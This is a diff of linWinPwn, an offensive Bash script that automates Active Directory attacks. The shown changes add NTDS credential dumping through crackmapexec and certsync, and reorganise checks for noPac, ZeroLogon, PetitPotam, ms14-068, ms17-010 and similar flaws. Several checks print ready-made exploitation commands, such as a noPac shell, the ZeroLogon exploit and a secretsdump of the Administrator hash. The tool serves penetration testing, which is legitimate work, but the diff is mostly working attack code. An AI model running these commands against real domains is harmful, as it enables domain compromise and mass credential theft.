@@ -28,6 +28,7 @@ ldaps_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
+crackmapexec=$(which crackmapexec)
 impacket_findDelegation=$(which findDelegation.py)
 if [ ! -f "${impacket_findDelegation}" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi
 impacket_GetUserSPNs=$(which GetUserSPNs.py)
@@ -44,16 +45,16 @@ enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="${scripts_dir}/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
 ldapdomaindump=$(which ldapdomaindump)
-crackmapexec=$(which crackmapexec)
-john=$(which john)
 smbmap=$(which smbmap)
-nmap=$(which nmap)
 adidnsdump=$(which adidnsdump)
 certi_py=$(which certi.py)
 certipy=$(which certipy)
 ldeep=$(which ldeep)
 pre2k=$(which pre2k)
+certsync=$(which certsync)
 donpapi_dir="$scripts_dir/DonPAPI-main"
+nmap=$(which nmap)
+john=$(which john)
 
 print_banner () {
     echo -e "
@@ -63,7 +64,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.7.0 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.7.1 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -145,8 +146,12 @@ prepare (){
         echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
         sudo timedatectl set-ntp 0
         sudo ntpdate ${dc_ip}
-        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
-        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
+        if [[ ! $(grep ${dc_ip} "/etc/hosts") ]]; then
+            echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
+            echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
+        else
+            echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
+        fi
     fi
 
     nullsess_bool=false
@@ -179,8 +184,8 @@ prepare (){
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
         argument_cme=("-u" "" "-p" "")
-        argument_smbmap=""
         argument_imp="${domain}/"
+        argument_smbmap=""
         argument_ldeep="-d ${dc_domain} -a"
         argument_pre2k="-d ${domain}"
         auth_string="${YELLOW}[i]${NC} Authentication method: null session ${NC}"
@@ -196,16 +201,17 @@ prepare (){
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
         argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "")
+        argument_imp="${domain}/${user}:''" 
+        argument_bhd="-u ${user}@${domain} -p ''"
         argument_ldapdns="-u ${domain}\\${user} -p ''"
         argument_smbmap="-d ${domain} -u ${user} -p ''"
-        argument_imp="${domain}/${user}:''"
         argument_certi_py="${domain}/${user}:''"
-        argument_bhd="-u ${user}@${domain} -p ''"
-        argument_windap="-d ${domain} -u ${user} -p ''"
         argument_certipy="-u ${user}@${domain} -p ''"
         argument_ldeep="-d ${domain} -u ${user} -p '' -a"
-        argument_targkerb="-d ${domain} -u ${user} -p ''"
         argument_pre2k="-d ${domain} -u ${user} -p ''"
+        argument_certsync="-d ${domain} -u ${user} -p ''"
+        argument_windap="-d ${domain} -u ${user} -p ''"
+        argument_targkerb="-d ${domain} -u ${user} -p ''"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
     
     #Check if NTLM hash is used, and complete with empty LM hash
@@ -218,19 +224,20 @@ prepare (){
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
         argument_cme=("-d" "${domain}" "-u" "${user}" "-H" "${password}")
+        argument_imp=" -hashes ${password} ${domain}/${user}"
+        argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $password 1 32)"
+        argument_bhd="-u ${user}@${domain} --hashes ${password}"
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
-        argument_imp=" -hashes ${password} ${domain}/${user}"
         argument_certi_py="${domain}/${user} --hashes ${password}"
+        argument_certipy="-u ${user}@${domain} -hashes ${password}"
+        argument_ldeep="-d ${domain} -u ${user} -H ${password}"
+        argument_pre2k="-d ${domain} -u ${user} -hashes ${password}"
+        argument_certsync="-d ${domain} -u ${user} -hashes ${password}"
         argument_donpapi=" -H ${password} ${domain}/${user}"
-        argument_bhd="-u ${user}@${domain} --hashes ${password}"
         argument_silenthd="-u ${domain}\\${user} --hashes ${password}"
         argument_windap="-d ${domain} -u ${user} --hash ${password}"
-        argument_certipy="-u ${user}@${domain} -hashes ${password}"
-        argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $password 1 32)"
-        argument_ldeep="-d ${domain} -u ${user} -H ${password}"
         argument_targkerb="-d ${domain} -u ${user} -H ${password}"
-        argument_pre2k="-d ${domain} -u ${user} -hashes ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
     
     #Check if kerberos ticket is used
@@ -242,14 +249,15 @@ prepare (){
         export KRB5CCNAME=$(realpath $password)
         argument_cme=("-d" "${domain}" "-u" "${user}" "--use-kcache")
         argument_imp="-k -no-pass ${domain}/${user}"
-        argument_certi_py="${domain}/${user} -k --no-pass"
-        argument_donpapi="-k -no-pass ${domain}/${user}"
-        argument_bhd="-u ${user}@${domain} -k -no-pass"
-        argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
         argument_enum4linux="-w ${domain} -u ${user} -K ${password}"
+        argument_bhd="-u ${user}@${domain} -k -no-pass"
+        argument_certi_py="${domain}/${user} -k --no-pass"
+        argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
         argument_ldeep="-d ${domain} -u ${user} -k"
-        argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
         argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
+        argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass"
+        argument_donpapi="-k -no-pass ${domain}/${user}"
+        argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
         kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
         auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
     
@@ -259,19 +267,20 @@ prepare (){
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
         argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "${password}")
-        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
-        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_imp="${domain}/${user}:${password}"
-        argument_certi_py="${domain}/${user}:${password}"
-        argument_donpapi="${domain}/${user}:${password}"
+        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
+        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
         argument_bhd="-u ${user}@${domain} -p ${password}"
+        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
+        argument_certi_py="${domain}/${user}:${password}"
+        argument_certipy="-u ${user}@${domain} -p ${password}"
+        argument_ldeep="-d ${domain} -u ${user} -p ${password}"
+        argument_pre2k="-d ${domain} -u ${user} -p ${password}"
+        argument_certsync="-d ${domain} -u ${user} -p ${password}"
+        argument_donpapi="${domain}/${user}:${password}"
         argument_silenthd="-u ${domain}\\${user} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
-        argument_certipy="-u ${user}@${domain} -p ${password}"
-        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
-        argument_ldeep="-d ${domain} -u ${user} -p ${password}"
         argument_targkerb="-d ${domain} -u ${user} -p ${password}"
-        argument_pre2k="-d ${domain} -u ${user} -p ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
     fi
 
@@ -285,10 +294,10 @@ prepare (){
 
     mkdir -p ${output_dir}/Scans
     mkdir -p ${output_dir}/DomainRecon/BloodHound
-    mkdir -p ${output_dir}/DomainRecon/LDAPDump
+    mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
     mkdir -p ${output_dir}/DomainRecon/ADCS
     mkdir -p ${output_dir}/DomainRecon/SilentHound
-    mkdir -p ${output_dir}/DomainRecon/ldeepdump
+    mkdir -p ${output_dir}/DomainRecon/ldeepDump
     mkdir -p ${output_dir}/Kerberos
     mkdir -p ${output_dir}/Shares/SharesDump
     mkdir -p ${output_dir}/Credentials
@@ -371,6 +380,7 @@ smb_scan () {
     fi
 }
 
+###### AD Enumeration
 bhd_enum () {
     if [ ! -f "${bloodhound}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
@@ -622,20 +632,20 @@ ldapdomaindump_enum () {
         echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
     else
         echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
-        if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDump/ 2>/dev/null)" ] ; then
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
         else
             if [ "${nullsess_bool}" == true ] ; then
-                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump 2>/dev/null
+                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>/dev/null
             elif [ "${kerb_bool}" == true ] ; then
                     echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos tickets${NC}"
             else
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
-                ${ldapdomaindump} ${argument_ldapdns} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump 2>/dev/null
+                ${ldapdomaindump} ${argument_ldapdns} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>/dev/null
             fi
         #Parsing user and computer lists
-        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldd_${dc_domain}.txt 2>&1
-        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_ldd_${dc_domain}.txt 2>&1
+        /bin/cat ${output_dir}/DomainRecon/LDAPDomainDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldd_${dc_domain}.txt 2>&1
+        /bin/cat ${output_dir}/DomainRecon/LDAPDomainDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_ldd_${dc_domain}.txt 2>&1
         fi
     fi
     echo -e ""
@@ -672,10 +682,10 @@ ldeep_enum () {
         echo -e "${RED}[-] Please verify the location of ldeep${NC}"
     else
         echo -e "${BLUE}[*] ldeep Enumeration${NC}"
-        if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepdump/ 2>/dev/null)" ] ; then
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepDump/ 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
         else
-            ${ldeep} ldap ${argument_ldeep} -s ldap://"${target}" all ${output_dir}/DomainRecon/ldeepdump/${dc_domain} | tee ${output_dir}/DomainRecon/ldeepdump/ldeep_output_${dc_domain}.txt 2>/dev/null
+            ${ldeep} ldap ${argument_ldeep} -s ldap://"${target}" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain} | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt 2>/dev/null
         fi
     fi
     echo -e ""
@@ -709,6 +719,7 @@ windapsearch_enum () {
     echo -e ""
 }
 
+###### Kerberos attacks
 kerbrute_enum () {
     echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
@@ -904,6 +915,7 @@ john_crack_kerberoast(){
     echo -e ""
 }
 
+###### Shares scan
 smb_map () {
     if [ ! -f "${smbmap}" ]; then
         echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
@@ -976,6 +988,171 @@ keepass_scan () {
     echo -e ""
 }
 
+###### Vulnerability checks
+nopac_check () {
+    echo -e "${BLUE}[*] NoPac check ${NC}"
+    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
+    if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
+        echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
+        echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -shell [-use-ldap]"
+        echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -dump [-use-ldap]"
+    fi
+    echo -e ""
+}
+
+petitpotam_check () {
+    echo -e "${BLUE}[*] PetitPotam check ${NC}"
+    for i in $(/bin/cat ${target_dc}); do
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
+    done
+    echo -e ""
+}
+
+dfscoerce_check () {
+    echo -e "${BLUE}[*] dfscoerce check ${NC}"
+    for i in $(/bin/cat ${target_dc}); do
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
+    done
+    echo -e ""
+}
+
+zerologon_check () {
+    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
+    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
+    if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
+        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
+        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
+        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator"
+        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip"
+        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>"
+    fi
+    echo -e ""
+}
+
+ms14-068_check () {
+    echo -e "${BLUE}[*] ms14-068 check ${NC}"
+    if [ ! -f "${impacket_goldenPac}" ]; then
+        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
+    else
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] ms14-068 requires credentials${NC}"
+        else
+            ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
+            if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
+                echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found (False positives possible on newer versions of Windows)! Follow steps below for exploitation:${NC}"
+                echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
+            fi
+        fi
+    fi
+    echo -e ""
+}
+
+ms17-010_check () {
+    echo -e "${BLUE}[*] ms17-010 check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
+    echo -e ""
+}
+
+spooler_check () {
+    echo -e "${BLUE}[*] Print Spooler check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
+    echo -e ""
+}
+
+webdav_check () {
+    echo -e "${BLUE}[*] WebDAV check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
+    echo -e ""
+}
+
+shadowcoerce_check () {
+    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
+    echo -e ""
+}
+
+smbsigning_check () {
+    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} 2>/dev/null | grep "signing:False" | sort -u | tee -a ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
+    if [ ! -s ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt ]; then
+        echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
+    fi
+    echo -e ""
+}
+
+ntlmv1_check () {
+    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
+    echo -e ""
+}
+
+runasppl_check () {
+    echo -e "${BLUE}[*] runasppl check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
+    echo -e ""
+}
+
+#MSSQL scan
+mssql_enum () {
+    if [ ! -f "${scripts_dir}/windapsearch" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
+        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
+    else
+        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
+        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
+            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
+        fi
+        if [ "${nullsess_bool}" == false ]; then
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
+
+        fi
+        for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
+            grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >> ${sql_ip_list}
+        done
+        if [ ! -f "${sql_ip_list}" ] ; then
+             echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
+        else
+            ${crackmapexec} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+        fi
+    fi
+    echo -e ""
+}
+
+###### Password Dump
 laps_dump () {
     echo -e "${BLUE}[*] LAPS Dump${NC}"
     ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
@@ -1020,6 +1197,16 @@ secrets_dump () {
                 ${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
             done
         fi
+    fi
+    echo -e ""
+}
+
+ntds_dump () {
+    echo -e "${BLUE}[*] Dumping NTDS using crackmapexec${NC}"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
+    else
+        ${crackmapexec} smb ${target} "${argument_cme[@]}" --ntds | tee -a ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -1181,165 +1368,18 @@ masky_dump () {
     echo -e ""
 }
 
-mssql_enum () {
-    if [ ! -f "${scripts_dir}/windapsearch" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
-        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
+certsync_ntds_dump () {
+    if [ ! -f "${certsync}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
     else
-        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
-        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
-            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
-        fi
-        if [ "${nullsess_bool}" == false ]; then
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
-
-        fi
-        for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
-            grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >> ${sql_ip_list}
-        done
-        if [ ! -f "${sql_ip_list}" ] ; then
-             echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
+        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
         else
-            ${crackmapexec} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+            ${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt
         fi
     fi
-    echo -e ""
-}
-
-nopac_check () {
-    echo -e "${BLUE}[*] NoPac check ${NC}"
-    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
-    if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
-        echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
-        echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -shell [-use-ldap]"
-        echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -dump [-use-ldap]"
-    fi
-    echo -e ""
-}
-
-petitpotam_check () {
-    echo -e "${BLUE}[*] PetitPotam check ${NC}"
-    for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
-    done
-    echo -e ""
-}
-
-dfscoerce_check () {
-    echo -e "${BLUE}[*] dfscoerce check ${NC}"
-    for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
-    done
-    echo -e ""
-}
-
-zerologon_check () {
-    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
-    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
-    if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
-        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
-        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
-        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator"
-        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip"
-        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>"
-    fi
-    echo -e ""
-}
-
-ms14-068_check () {
-    echo -e "${BLUE}[*] ms14-068 check ${NC}"
-    if [ ! -f "${impacket_goldenPac}" ]; then
-        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
-    else
-        if [ "${nullsess_bool}" == true ]; then
-            echo -e "${PURPLE}[-] ms14-068 requires credentials${NC}"
-        else
-            ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
-            if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found (False positives possible on newer versions of Windows)! Follow steps below for exploitation:${NC}"
-                echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
-            fi
-        fi
-    fi
-    echo -e ""
-}
-
-ms17-010_check () {
-    echo -e "${BLUE}[*] ms17-010 check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
-    echo -e ""
-}
-
-spooler_check () {
-    echo -e "${BLUE}[*] Print Spooler check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
-    echo -e ""
-}
-
-webdav_check () {
-    echo -e "${BLUE}[*] WebDAV check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
-    echo -e ""
-}
-
-shadowcoerce_check () {
-    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
